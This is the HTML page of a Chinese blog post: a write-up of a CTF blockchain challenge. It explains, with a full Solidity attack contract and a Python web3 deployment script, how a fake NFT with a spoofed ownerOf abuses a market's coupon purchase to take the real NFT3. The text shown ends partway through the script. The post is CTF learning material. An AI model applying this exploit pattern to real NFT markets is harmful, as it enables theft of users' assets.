@@ -1,0 +1,495 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>强网拟态小结-blockchian&amp;web - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/4.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="强网拟态小结-blockchian&web">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-11-09 12:46" pubdate>
+        2022年11月9日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">强网拟态小结-blockchian&amp;web</h1>
+            
+            <div class="markdown-body">
+              <h1 id="强网拟态小结-blockchian-amp-web"><a href="#强网拟态小结-blockchian-amp-web" class="headerlink" title="强网拟态小结-blockchian&amp;web"></a>强网拟态小结-blockchian&amp;web</h1><h2 id="blockchain"><a href="#blockchain" class="headerlink" title="blockchain"></a>blockchain</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>做法其实和TCTF的那个nft差不多，但版本修改了abi编码的漏洞不再有用，所以最后买nft3的步骤是有差别的，但前两个是一样的。</p>
+<ul>
+<li>从airdrop可以拿5个token，直接买NFT1</li>
+<li>挂NFT1低价 然后用purchasetest挂高价NFT1让NFTMARKET去买高价的NFT然后就有钱买NFT2了</li>
+<li>造一个假的nft3放到order的第一个，在<code>purchaseWithCoupon</code>里面事先会<code>_deleteOrder</code>一次，然后再获取我们假的nft的owner（也就是我们自己），最后<code>getOrder(coupon.orderId).nftAddress</code>（这也是唯一和tctf不一样的地方）获取真的nft3，但此时owner是我们自己，所以最后<code>safeTransferFrom</code>这里导致最后能够修改真正nft3的拥有者。</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/3389af125169e0cd2ba4f70c10e26930.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>攻击合约</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">pragma solidity <span class="hljs-number">0.8</span>.<span class="hljs-number">16</span>;<br><br>import <span class="hljs-string">&quot;./source.sol&quot;</span>;<br>contract Attack &#123;<br><br>    CtfMarket public ctfMarket;<br>    address public account;<br>    CtfNFT public ctfNFT;<br>    CtfToken public ctfToken;<br>    HackerNFT public HackerNft;<br><br>    <span class="hljs-keyword">function</span> set<span class="hljs-constructor">CtfMarket_addr(<span class="hljs-params">address</span> <span class="hljs-params">addr</span>)</span> public &#123;<br>        ctfMarket = <span class="hljs-constructor">CtfMarket(<span class="hljs-params">addr</span>)</span>;<br>        ctfNFT= <span class="hljs-constructor">CtfNFT(<span class="hljs-params">address</span>(<span class="hljs-params">ctfMarket</span>.<span class="hljs-params">ctfNFT</span>()</span>));<br>        ctfToken=<span class="hljs-constructor">CtfToken(<span class="hljs-params">address</span>(<span class="hljs-params">ctfMarket</span>.<span class="hljs-params">ctfToken</span>()</span>));<br>        HackerNft = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HackerNFT(<span class="hljs-params">address</span>(<span class="hljs-params">ctfMarket</span>)</span>,address(ctfMarket.verifier<span class="hljs-literal">()</span>),address(account));<br>    &#125;<br>    <span class="hljs-keyword">function</span> setaccount(address addr) public &#123;<br>        account = addr;<br><br>    &#125;<br>    <span class="hljs-keyword">function</span> attack11<span class="hljs-literal">()</span> public&#123;<br>        ctfToken.airdrop<span class="hljs-literal">()</span>;<br>        ctfMarket.create<span class="hljs-constructor">Order(<span class="hljs-params">address</span>(HackerNft)</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>);<br>        this.approve(address(this), <span class="hljs-number">1</span>);<br>        ctfToken.approve(address(ctfMarket),<span class="hljs-number">200000000000</span>);<br>        ctfToken.approve(address(ctfNFT),<span class="hljs-number">200000000000</span>);<br>        ctfToken.approve(address(ctfToken),<span class="hljs-number">200000000000</span>);<br>        ctfMarket.purchase<span class="hljs-constructor">Order(0)</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> attack2<span class="hljs-literal">()</span> public &#123;<br>        ctfMarket.create<span class="hljs-constructor">Order(<span class="hljs-params">address</span>(<span class="hljs-params">ctfNFT</span>)</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);<br>        ctfNFT.set<span class="hljs-constructor">ApprovalForAll(<span class="hljs-params">address</span>(<span class="hljs-params">ctfMarket</span>)</span>,<span class="hljs-literal">true</span>);<br>        ctfMarket.purchase<span class="hljs-constructor">Test(<span class="hljs-params">address</span>(<span class="hljs-params">ctfNFT</span>)</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1337</span>);<br>        ctfMarket.purchase<span class="hljs-constructor">Order(1)</span>;<br>        ctfMarket.purchase<span class="hljs-constructor">Order(1)</span>;<br>    &#125;<br>    <span class="hljs-keyword">function</span> approve(address a,uint b) public &#123;<br><br>    &#125;<br>    <span class="hljs-keyword">function</span> safe<span class="hljs-constructor">TransferFrom(<span class="hljs-params">address</span> <span class="hljs-params">a</span>,<span class="hljs-params">address</span> <span class="hljs-params">b</span>,<span class="hljs-params">uint</span> <span class="hljs-params">c</span>)</span> public &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">function</span> get<span class="hljs-constructor">Fakenft()</span> public returns (address)&#123;<br>        return address(HackerNft);<br>    &#125;<br>    <span class="hljs-keyword">function</span> owner<span class="hljs-constructor">Of(<span class="hljs-params">uint</span> <span class="hljs-params">dd</span>)</span> public returns (address)&#123;<br>        <span class="hljs-keyword">if</span>(dd==<span class="hljs-number">2</span>)&#123;<br>            return address(this);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(dd==<span class="hljs-number">3</span>)&#123;<br>            return address(account);<br>        &#125;<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">function</span> attackfor3(uint8 v, bytes32 r, bytes32 s) public &#123;<br><br>        SignedCoupon memory scoupon;<br>        ctfNFT.set<span class="hljs-constructor">ApprovalForAll(<span class="hljs-params">account</span>,<span class="hljs-params">true</span>)</span>;<br>        ctfToken.approve(address(account),<span class="hljs-number">200000000000</span>);<br>        scoupon.coupon.orderId=<span class="hljs-number">0</span>;<br>        scoupon.coupon.newprice=<span class="hljs-number">1</span>;<br>        scoupon.coupon.issuer=address(account);<br>        scoupon.coupon.user=address(this);<br>        scoupon.coupon.reason=<span class="hljs-string">&quot;&quot;</span>;<br>        scoupon.signature.v=v;<br>        scoupon.signature.rs<span class="hljs-literal">[<span class="hljs-number">0</span>]</span>=r;<br>        scoupon.signature.rs<span class="hljs-literal">[<span class="hljs-number">1</span>]</span>=s;<br>        ctfMarket.purchaseWithCoupon&#123;gas:<span class="hljs-number">200000</span>&#125;(scoupon);<br><br>    &#125;<br><br>    <span class="hljs-keyword">function</span> attack4<span class="hljs-literal">()</span> public &#123;<br>        ctfNFT.set<span class="hljs-constructor">ApprovalForAll(<span class="hljs-params">account</span>,<span class="hljs-params">true</span>)</span>;<br>        ctfMarket.win<span class="hljs-literal">()</span>;<br>        ctfNFT.transfer<span class="hljs-constructor">From(<span class="hljs-params">address</span>(<span class="hljs-params">this</span>)</span>,address(account),<span class="hljs-number">1</span>);<br>        ctfNFT.transfer<span class="hljs-constructor">From(<span class="hljs-params">address</span>(<span class="hljs-params">this</span>)</span>,address(account),<span class="hljs-number">2</span>);<br>        ctfNFT.transfer<span class="hljs-constructor">From(<span class="hljs-params">address</span>(<span class="hljs-params">this</span>)</span>,address(account),<span class="hljs-number">3</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> on<span class="hljs-constructor">ERC721Received(<span class="hljs-params">address</span>, <span class="hljs-params">address</span>, <span class="hljs-params">uint256</span>, <span class="hljs-params">bytes</span> <span class="hljs-params">memory</span>)</span> public pure returns (bytes4) &#123;<br>        return this.onERC721Received.selector;<br>    &#125;<br>&#125;<br>contract AA &#123;<br><br>    <span class="hljs-keyword">function</span> on<span class="hljs-constructor">ERC721Received(<span class="hljs-params">address</span>, <span class="hljs-params">address</span>, <span class="hljs-params">uint256</span>, <span class="hljs-params">bytes</span> <span class="hljs-params">memory</span>)</span> public pure returns (bytes4) &#123;<br>        return this.onERC721Received.selector;<br>    &#125;<br><br>    address issuer;<br>    address user;<br>    uint256 newprice;<br>    <span class="hljs-built_in">bytes</span> reason;<br>    Order order;<br>    bytes32 public hashl;<br>    event deb(<br>         address  _issuer,<br>        address  _user,<br>        Order  order,<br>        uint newprice,<br>        <span class="hljs-built_in">bytes</span> reason<br>    );<br>    <span class="hljs-keyword">function</span> setinit(address _issuer, address _user, uint _newprice, address _nftaddress, uint _price, uint _tokenId) public &#123;<br>        issuer = _issuer;<br>        user = _user;<br>        newprice = _newprice;<br>        order.nftAddress = _nftaddress;<br>        order.price = _price;<br>        order.tokenId = _tokenId;<br><br>        <span class="hljs-built_in">bytes</span> memory serialized = abi.encode(<br>            <span class="hljs-string">&quot;I, the issuer&quot;</span>, issuer,<br>            <span class="hljs-string">&quot;offer a special discount for&quot;</span>, user,<br>            <span class="hljs-string">&quot;to buy&quot;</span>, order, <span class="hljs-string">&quot;at&quot;</span>, newprice,<br>            <span class="hljs-string">&quot;because&quot;</span>, <span class="hljs-string">&quot;&quot;</span><br>        );<br>        hashl = keccak256(serialized);<br>        emit deb(issuer,user,order,newprice,<span class="hljs-string">&quot;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> calcsign(bytes32 _ha,uint8 v, bytes32 r, bytes32 s) public view returns(address)&#123;<br>        return ecrecover(_ha, v, r, s);<br>    &#125;<br><br>&#125;<br>contract HackerNFT is ERC721, Ownable &#123;<br>    address public Market;<br>    address public Verifier;<br>    address public Hacker;<br>    address public Me;<br><br>    constructor(<br>        address _marketAddress,<br>        address _verifierAddress,<br>        address _me<br>    ) <span class="hljs-constructor">ERC721(<span class="hljs-string">&quot;HackerNFT&quot;</span>, <span class="hljs-string">&quot;NFT&quot;</span>)</span> public  &#123;<br>        Market = _marketAddress;<br>        Verifier = _verifierAddress;<br>        Hacker = msg.sender;<br>        Me = _me;<br>        <span class="hljs-constructor">_setApprovalForAll(<span class="hljs-params">address</span>(<span class="hljs-params">this</span>)</span>, Hacker, <span class="hljs-literal">true</span>);<br>        <span class="hljs-constructor">_setApprovalForAll(<span class="hljs-params">address</span>(Market)</span>, Hacker, <span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> mint(address <span class="hljs-keyword">to</span>, uint256 tokenId) <span class="hljs-keyword">external</span> onlyOwner &#123;<br>        <span class="hljs-constructor">_mint(<span class="hljs-params">to</span>, <span class="hljs-params">tokenId</span>)</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">function</span> owner<span class="hljs-constructor">Of(<span class="hljs-params">uint256</span> <span class="hljs-params">tokenId</span>)</span> public view override returns (address) &#123;<br>        <span class="hljs-keyword">if</span> (msg.sender<span class="hljs-operator"> == </span>Verifier) &#123;<br>            return Me;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (msg.sender<span class="hljs-operator"> == </span>Market) &#123;<br>            return Market;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            return Hacker;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>攻击脚本，本地私链一键部署和攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> solcx<br><span class="hljs-keyword">from</span> solcx <span class="hljs-keyword">import</span> compile_files<br><span class="hljs-keyword">from</span> web3 <span class="hljs-keyword">import</span> Web3,HTTPProvider<br><span class="hljs-keyword">from</span> hexbytes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_tx</span>(<span class="hljs-params">chainID, to, data, value</span>):</span><br>    <span class="hljs-comment"># print(web3.eth.gasPrice)</span><br>    <span class="hljs-comment"># print(web3.eth.getTransactionCount(Web3.toChecksumAddress(account_address)))</span><br>    txn = &#123;<br>        <span class="hljs-string">&#x27;chainId&#x27;</span>: chainID,<br>        <span class="hljs-string">&#x27;from&#x27;</span>: Web3.toChecksumAddress(account_address),<br>        <span class="hljs-string">&#x27;to&#x27;</span>: to,<br>        <span class="hljs-string">&#x27;gasPrice&#x27;</span>: web3.eth.gasPrice ,<br>        <span class="hljs-string">&#x27;gas&#x27;</span>: <span class="hljs-number">672197400</span>,<br>        <span class="hljs-string">&#x27;nonce&#x27;</span>: web3.eth.getTransactionCount(Web3.toChecksumAddress(account_address)) ,<br>        <span class="hljs-string">&#x27;value&#x27;</span>: Web3.toWei(value, <span class="hljs-string">&#x27;ether&#x27;</span>),<br>        <span class="hljs-string">&#x27;data&#x27;</span>: data,<br>    &#125;<br>    <span class="hljs-comment"># print(txn)</span><br>    <span class="hljs-keyword">return</span> txn<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sign_and_send</span>(<span class="hljs-params">txn</span>):</span><br>    signed_txn = web3.eth.account.signTransaction(txn, private_key)<br>    txn_hash = web3.eth.sendRawTransaction(signed_txn.rawTransaction).<span class="hljs-built_in">hex</span>()<br>    txn_receipt = web3.eth.waitForTransactionReceipt(txn_hash)<br>    <span class="hljs-comment"># print(&quot;txn_hash=&quot;, txn_hash)</span><br>    <span class="hljs-keyword">return</span> txn_receipt<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deploy_attack</span>():</span><br>    compiled_sol = compile_files([<span class="hljs-string">&quot;attack.sol&quot;</span>],output_values=[<span class="hljs-string">&quot;abi&quot;</span>, <span class="hljs-string">&quot;bin&quot;</span>],solc_version=<span class="hljs-string">&quot;0.8.16&quot;</span>)<br>    data = compiled_sol[<span class="hljs-string">&#x27;attack.sol:Attack&#x27;</span>][<span class="hljs-string">&#x27;bin&#x27;</span>]<br>    <span class="hljs-comment"># print(data)</span><br>    txn = generate_tx(chain_id, <span class="hljs-string">&#x27;&#x27;</span>, data, <span class="hljs-number">0</span>)<br>    txn_receipt = sign_and_send(txn)<br>    attack_abi = compiled_sol[<span class="hljs-string">&#x27;attack.sol:Attack&#x27;</span>][<span class="hljs-string">&#x27;abi&#x27;</span>]<br>    <span class="hljs-comment"># print(txn_receipt)</span><br>    <span class="hljs-keyword">if</span> txn_receipt[<span class="hljs-string">&#x27;status&#x27;</span>] == <span class="hljs-number">1</span>:<br>        attack_address = txn_receipt[<span class="hljs-string">&#x27;contractAddress&#x27;</span>]<br>        <span class="hljs-keyword">return</span> attack_address,attack_abi<br>    <span class="hljs-keyword">else</span>:<br>        exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deploy_nft</span>():</span><br>    compiled_sol = compile_files([<span class="hljs-string">&quot;ctf.sol&quot;</span>],output_values=[<span class="hljs-string">&quot;abi&quot;</span>, <span class="hljs-string">&quot;bin&quot;</span>],solc_version=<span class="hljs-string">&quot;0.8.16&quot;</span>)<br>    data = compiled_sol[<span class="hljs-string">&#x27;ctf.sol:CtfMarket&#x27;</span>][<span class="hljs-string">&#x27;bin&#x27;</span>]<br>    <span class="hljs-comment"># print(data)</span><br>    txn = generate_tx(chain_id, <span class="hljs-string">&#x27;&#x27;</span>, data, <span class="hljs-number">0</span>)<br>    txn_receipt = sign_and_send(txn)<br>    attack_abi = compiled_sol[<span class="hljs-string">&#x27;ctf.sol:CtfMarket&#x27;</span>][<span class="hljs-string">&#x27;abi&#x27;</span>]<br>    <span class="hljs-comment"># print(txn_receipt)</span><br>    <span class="hljs-keyword">if</span> txn_receipt[<span class="hljs-string">&#x27;status&#x27;</span>] == <span class="hljs-number">1</span>:<br>        attack_address = txn_receipt[<span class="hljs-string">&#x27;contractAddress&#x27;</span>]<br>        <span class="hljs-keyword">return</span> attack_address,attack_abi<br>    <span class="hljs-keyword">else</span>:<br>        exit(<span class="hljs-number">0</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deploy_AA</span>():</span><br>    compiled_sol = compile_files([<span class="hljs-string">&quot;attack.sol&quot;</span>],output_values=[<span class="hljs-string">&quot;abi&quot;</span>, <span class="hljs-string">&quot;bin&quot;</span>],solc_version=<span class="hljs-string">&quot;0.8.16&quot;</span>)<br>    data = compiled_sol[<span class="hljs-string">&#x27;attack.sol:AA&#x27;</span>][<span class="hljs-string">&#x27;bin&#x27;</span>]<br>    txn = generate_tx(chain_id, <span class="hljs-string">&#x27;&#x27;</span>, data, <span class="hljs-number">0</span>)<br>    txn_receipt = 